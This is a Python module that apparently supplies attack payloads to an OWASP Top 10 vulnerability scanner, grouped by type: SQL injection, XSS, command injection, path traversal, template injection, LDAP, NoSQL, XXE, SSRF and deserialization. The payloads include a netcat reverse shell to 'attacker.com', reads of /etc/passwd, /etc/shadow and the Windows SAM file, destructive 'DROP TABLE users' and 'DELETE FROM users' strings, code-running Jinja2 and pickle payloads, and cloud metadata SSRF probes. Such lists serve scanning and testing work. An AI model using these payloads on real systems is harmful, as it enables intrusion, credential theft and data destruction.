"""
Enhanced payload generator for OWASP Top 10 scanning.
Provides comprehensive test payloads for all injection types.
"""

from typing import Dict, List

COMPREHENSIVE_PAYLOADS = {
    "sqli": [
        # Basic indicators
        "1'",
        "1\" --",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "1' OR '1'='1' --",
        # UNION-based
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL --",
        # Time-based blind
        "1' AND SLEEP(5) --",
        "1' AND WAITFOR DELAY '00:00:05' --",
        "1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --",
        # Boolean-based blind
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        # Database-specific
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "1 OR 1=1",
        "admin' --",
    ],
    
    "xss": [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Attribute-based
        "\" onfocus=\"alert('XSS')\" autofocus=\"",
        "' onclick='alert(\"XSS\")' type='",
        "<input onfocus=alert('XSS') autofocus>",
        
        # Event handlers
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<form action=javascript:alert('XSS')><input/type=submit>",
        
        # Encoded/obfuscated
        "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "javascript:alert('XSS')",
    ],
    
    "command_injection": [
        # Unix/Linux
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "$( whoami)",
        
        # Windows
        "& whoami",
        "| dir",
        "; dir",
        "` ipconfig`",
        "cmd /c dir",
        
        # Blind command injection
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        
        # Data exfiltration
        "; cat /etc/passwd",
        "| type C:\\\\windows\\\\win.ini",
        "`nc -e /bin/sh attacker.com 4444`",
    ],
    
    "path_traversal": [
        # Basic traversal
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        
        # With extensions
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        
        # Encoded
        "%2e%2e%2f",
        "..%252f",
        "..%c0%af",
        
        # Common targets
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\config\\sam",
    ],
    
    "template_injection": [
        # Jinja2
        "{{7*7}}",
        "{{config}}",
        "{{self}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        
        # Django
        "{% debug %}",
        "{% for x in ().__class__.__bases__[0].__subclasses__() %}",
        
        # Expression Language (Java)
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
    ],
    
    "ldap_injection": [
        "*",
        "*)(uid=*",
        "*)(|(uid=*",
        "*)(uid=*))(&(uid=*",
        "admin)(|(password=*",
    ],
    
    "nosql_injection": [
        "{'$ne': null}",
        "{\"$ne\": null}",
        "'; return true; //",
        "1'; return true; //",
        "{\"$where\": \"1 == 1\"}",
        "{\"$where\": \"function(){return 1}()\"}",
    ],
    
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY xxe SYSTEM "file:///c:/boot.ini">',
    ],
    
    "ssrf": [
        # Localhost
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        
        # Internal networks
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        
        # Bypass techniques
        "http://localhost:80",
        "http://127.0.0.1:22",
        "http://[::1]",
        "http://169.254.169.254.xip.io",
    ],
    
    "deserialization": [
        # Java serialization
        "ac1d1cc0ff",  # Java serialization magic
        # Python pickle
        "cos\\nsystem\\np0\\n(S'id'\\ntRp1\\n.",
        # PHP serialization
        "O:3:\"obj\":0:{}",
    ],
}


def get_payloads(attack_type: str) -> List[str]:
    """Get payloads for specific attack type."""
    return COMPREHENSIVE_PAYLOADS.get(attack_type, [])


def get_all_attack_types() -> List[str]:
    """Get all available attack types."""
    return list(COMPREHENSIVE_PAYLOADS.keys())
